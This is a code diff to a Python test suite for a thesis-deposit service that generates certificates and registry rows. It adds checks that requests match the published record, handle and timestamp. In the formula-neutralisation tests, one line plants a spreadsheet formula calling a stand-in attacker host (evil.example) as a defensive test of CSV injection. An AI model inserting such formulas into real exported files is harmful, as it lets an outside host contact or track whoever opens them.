@@ -31,6 +31,7 @@ from docx import Document
 from docx.oxml import OxmlElement
 from docx.oxml.ns import qn
 
+import validator.api
 from validator.constancia import (
     DatosConstancia,
     ErrorDatosConstancia,
@@ -43,6 +44,7 @@ RUTA_PLANTILLA_REAL = RECURSOS_DIR / "TESIS DIGITAL MODELO B-2026.docx"
 HANDLE = "https://hdl.handle.net/20.500.14414/26042"
 TIMESTAMP = "2026-01-20T18:10:00"
 FIRMA = "Lic. José Prueba"
+TRAMITE_ID = ""
 
 
 # ---------------------------------------------------------------------------
@@ -175,6 +177,34 @@ def _entorno_constancia(monkeypatch):
     monkeypatch.setenv("VISTOBUENO_FIRMA", FIRMA)
     monkeypatch.setenv("VISTOBUENO_PLANTILLA_CONSTANCIA", str(_plantilla_sintetica()))
     yield
+
+
+def _publicar_tramite(ficha: dict, timestamp: str = TIMESTAMP) -> str:
+    """Publica la ficha canónica y su depósito vigente.
+
+    El papeleo se genera con estos valores del servidor. La solicitud solo
+    confirma que el cliente sigue trabajando con el mismo estado.
+    """
+    global TRAMITE_ID
+    validator.api._BUZON.limpiar()
+    TRAMITE_ID, _ = validator.api._BUZON.publicar_ficha(ficha)
+    validator.api._BUZON.reportar_deposito(
+        {
+            "tramite_id": TRAMITE_ID,
+            "handle": HANDLE,
+            "titulo_observado": "Tesis de prueba",
+            "timestamp": timestamp,
+        }
+    )
+    return TRAMITE_ID
+
+
+@pytest.fixture(autouse=True)
+def _deposito_vigente():
+    """Ata el papeleo a un depósito vigente, como exige el contrato v1.13.0."""
+    _publicar_tramite(_ficha())
+    yield
+    validator.api._BUZON.limpiar()
 
 
 def _document_xml(contenido: bytes) -> str:
@@ -428,12 +458,26 @@ class TestLlenadoConstancia:
 # ---------------------------------------------------------------------------
 
 
-def _solicitud(autores=None, matriculas=None, indice=0):
+def _solicitud(
+    autores=None,
+    matriculas=None,
+    indice=0,
+    titulo="Tesis de prueba",
+    timestamp=TIMESTAMP,
+):
     ficha = _ficha(
+        titulo=titulo,
         autores=autores,
         matriculas=matriculas,
     )
-    return {"ficha": ficha, "handle": HANDLE, "timestamp": TIMESTAMP, "indice_autor": indice}
+    tramite_id = _publicar_tramite(ficha, timestamp=timestamp)
+    return {
+        "ficha": ficha,
+        "tramite_id": tramite_id,
+        "handle": HANDLE,
+        "timestamp": timestamp,
+        "indice_autor": indice,
+    }
 
 
 class TestEndpointConstancia:
@@ -477,15 +521,13 @@ class TestEndpointConstancia:
         assert "fuera de rango" in respuesta.json()["detail"]
 
     def test_timestamp_invalido_es_422(self):
-        solicitud = _solicitud()
-        solicitud["timestamp"] = "ayer"
+        solicitud = _solicitud(timestamp="ayer")
         respuesta = CLIENTE.post("/constancia", json=solicitud)
         assert respuesta.status_code == 422
         assert "Timestamp inválido" in respuesta.json()["detail"]
 
     def test_sin_titulo_es_422(self):
-        solicitud = _solicitud()
-        solicitud["ficha"]["extraidos"][0]["valor"] = None
+        solicitud = _solicitud(titulo=None)
         respuesta = CLIENTE.post("/constancia", json=solicitud)
         assert respuesta.status_code == 422
         assert "título" in respuesta.json()["detail"]
@@ -495,6 +537,46 @@ class TestEndpointConstancia:
         respuesta = CLIENTE.post("/constancia", json=_solicitud())
         assert respuesta.status_code == 500
         assert "VISTOBUENO_FIRMA" in respuesta.json()["detail"]
+
+    def test_sin_deposito_vigente_es_409(self):
+        """Sin depósito vigente no se puede generar papeleo."""
+        solicitud = _solicitud()
+        validator.api._BUZON.limpiar()
+        respuesta = CLIENTE.post("/constancia", json=solicitud)
+        assert respuesta.status_code == 409
+        assert "depósito" in respuesta.json()["detail"]
+
+    def test_tramite_ajeno_es_409(self):
+        """El papeleo de un trámite anterior no se genera."""
+        solicitud = _solicitud()
+        solicitud["tramite_id"] = "tramite-anterior"
+        respuesta = CLIENTE.post("/constancia", json=solicitud)
+        assert respuesta.status_code == 409
+        assert "trámite" in respuesta.json()["detail"]
+
+    def test_handle_ajeno_es_409(self):
+        """El handle debe ser el que reportó el userscript."""
+        solicitud = _solicitud()
+        solicitud["handle"] = "https://hdl.handle.net/20.500.14414/00000"
+        respuesta = CLIENTE.post("/constancia", json=solicitud)
+        assert respuesta.status_code == 409
+        assert "handle" in respuesta.json()["detail"]
+
+    def test_ficha_distinta_es_409(self):
+        """La ficha enviada debe ser la ficha publicada en el buzón."""
+        solicitud = _solicitud()
+        solicitud["ficha"]["extraidos"][0]["valor"] = "Tesis de otra persona"
+        respuesta = CLIENTE.post("/constancia", json=solicitud)
+        assert respuesta.status_code == 409
+        assert "ficha" in respuesta.json()["detail"].lower()
+
+    def test_timestamp_distinto_es_409(self):
+        """La hora del papeleo debe ser la que reportó el userscript."""
+        solicitud = _solicitud()
+        solicitud["timestamp"] = "2026-01-20T18:11:00"
+        respuesta = CLIENTE.post("/constancia", json=solicitud)
+        assert respuesta.status_code == 409
+        assert "timestamp" in respuesta.json()["detail"].lower()
 
     def test_plantilla_ausente_es_500(self, monkeypatch):
         monkeypatch.setenv("VISTOBUENO_PLANTILLA_CONSTANCIA", "/no/existe.docx")
@@ -540,6 +622,38 @@ class TestEndpointFilaRegistro:
         respuesta = CLIENTE.post("/fila-registro", json=solicitud)
         assert respuesta.status_code == 422
         assert "matrícula" in respuesta.json()["detail"]
+
+    def test_sin_deposito_vigente_es_409(self):
+        """La fila también exige el depósito vigente."""
+        solicitud = _solicitud()
+        validator.api._BUZON.limpiar()
+        respuesta = CLIENTE.post("/fila-registro", json=solicitud)
+        assert respuesta.status_code == 409
+        assert "depósito" in respuesta.json()["detail"]
+
+    def test_tramite_ajeno_es_409(self):
+        """Una fila de un trámite anterior no se genera."""
+        solicitud = _solicitud()
+        solicitud["tramite_id"] = "tramite-anterior"
+        respuesta = CLIENTE.post("/fila-registro", json=solicitud)
+        assert respuesta.status_code == 409
+        assert "trámite" in respuesta.json()["detail"]
+
+    def test_ficha_distinta_es_409(self):
+        """La fila tampoco puede usar una ficha ajena a la publicada."""
+        solicitud = _solicitud()
+        solicitud["ficha"]["manuales"][0]["valor"] = ["99999999-99"]
+        respuesta = CLIENTE.post("/fila-registro", json=solicitud)
+        assert respuesta.status_code == 409
+        assert "ficha" in respuesta.json()["detail"].lower()
+
+    def test_timestamp_distinto_es_409(self):
+        """La fila debe conservar la hora del depósito vigente."""
+        solicitud = _solicitud()
+        solicitud["timestamp"] = "2026-01-20T18:11:00"
+        respuesta = CLIENTE.post("/fila-registro", json=solicitud)
+        assert respuesta.status_code == 409
+        assert "timestamp" in respuesta.json()["detail"].lower()
 
 
 # ---------------------------------------------------------------------------
@@ -588,8 +702,7 @@ class TestFormatosRegistro:
 
     def test_formato_csv_cita_campo_con_separador(self):
         """Un título con ';' viaja citado: la fila no se descuadra."""
-        solicitud = _solicitud()
-        solicitud["ficha"]["extraidos"][0]["valor"] = "Título; con; punto y coma"
+        solicitud = _solicitud(titulo="Título; con; punto y coma")
         respuesta = CLIENTE.post("/fila-registro?formato=csv", json=solicitud)
         assert respuesta.status_code == 200
         linea = respuesta.content.decode("utf-8").lstrip("\ufeff").strip()
@@ -693,9 +806,7 @@ class TestNeutralizacionFormulas:
 
     @staticmethod
     def _solicitud_formula():
-        solicitud = _solicitud()
-        solicitud["ficha"]["extraidos"][0]["valor"] = '=WEBSERVICE("http://evil.example/ping")'
-        return solicitud
+        return _solicitud(titulo='=WEBSERVICE("http://evil.example/ping")')
 
     def test_csv_neutraliza_formula_en_el_titulo(self):
         respuesta = CLIENTE.post("/fila-registro?formato=csv", json=self._solicitud_formula())
@@ -778,8 +889,7 @@ class TestHoraPeru:
 
     def test_fila_usa_la_hora_peruana_tambien_de_noche(self):
         """23:30 del 30 no debe convertirse en 04:30 del 31."""
-        solicitud = _solicitud()
-        solicitud["timestamp"] = "2026-10-30T23:30:00"
+        solicitud = _solicitud(timestamp="2026-10-30T23:30:00")
         respuesta = CLIENTE.post("/fila-registro", json=solicitud)
         assert respuesta.status_code == 200
         columnas = respuesta.json()["filas"][0].split("\t")
@@ -789,8 +899,7 @@ class TestHoraPeru:
         assert columnas[7] == "23:30:00"  # HORA
 
     def test_fila_convierte_un_timestamp_con_offset(self):
-        solicitud = _solicitud()
-        solicitud["timestamp"] = "2026-10-20T02:00:00+00:00"
+        solicitud = _solicitud(timestamp="2026-10-20T02:00:00+00:00")
         respuesta = CLIENTE.post("/fila-registro", json=solicitud)
         assert respuesta.status_code == 200
         columnas = respuesta.json()["filas"][0].split("\t")
@@ -837,8 +946,11 @@ class TestConstanciasConCapturaReal:
             if campo != "matricula"
         ]
         manuales.append({"campo": "matricula", "valor": ["15185003-20", "10130005-20"]})
+        ficha = {"extraidos": extraidos, "manuales": manuales}
+        tramite_id = _publicar_tramite(ficha)
         return {
-            "ficha": {"extraidos": extraidos, "manuales": manuales},
+            "ficha": ficha,
+            "tramite_id": tramite_id,
             "handle": HANDLE,
             "timestamp": TIMESTAMP,
             "indice_autor": indice,
